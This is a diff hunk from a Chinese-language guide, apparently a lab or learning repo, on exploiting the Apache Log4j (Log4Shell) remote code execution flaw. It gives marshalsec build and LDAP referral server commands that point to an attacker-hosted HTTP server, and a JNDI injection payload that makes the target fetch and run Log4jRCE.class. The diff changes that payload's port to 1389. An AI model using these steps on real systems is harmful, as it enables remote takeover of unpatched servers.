@@ -16,7 +16,7 @@ Apache Log4j 远程代码执行
    2. cd切换进这个项目内`cd marshalsec`
    3. 构建项目jar包`mvn clean package -DskipTests`
    4. 启动ldap server并配置转发到之前启动的http server内的资源（原理是访问这个ldap服务的任意路由，都会获得http server内的一个固定资源） `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://(这里写http server在公网上的地址及端口)/#Log4jRCE"`
-      此时对靶机提交${jndi:idap://ip:port/{随便写}}即可，ldap server会自动从http server中下载指定资源并返回给靶机。
+      此时对靶机提交${jndi:idap://ip:1389/{随便写}}即可，ldap server会自动从http server中下载指定资源并返回给靶机。
 3. log4j.java是一个简单的漏洞环境实现，在代码中对应位置写好ldap的地址即可。底层原理就是靶机会远程下载Log4jRCE.class，然后执行newInstance()，所以会执行static、构造函数代码。
 
 ### 修复方案：
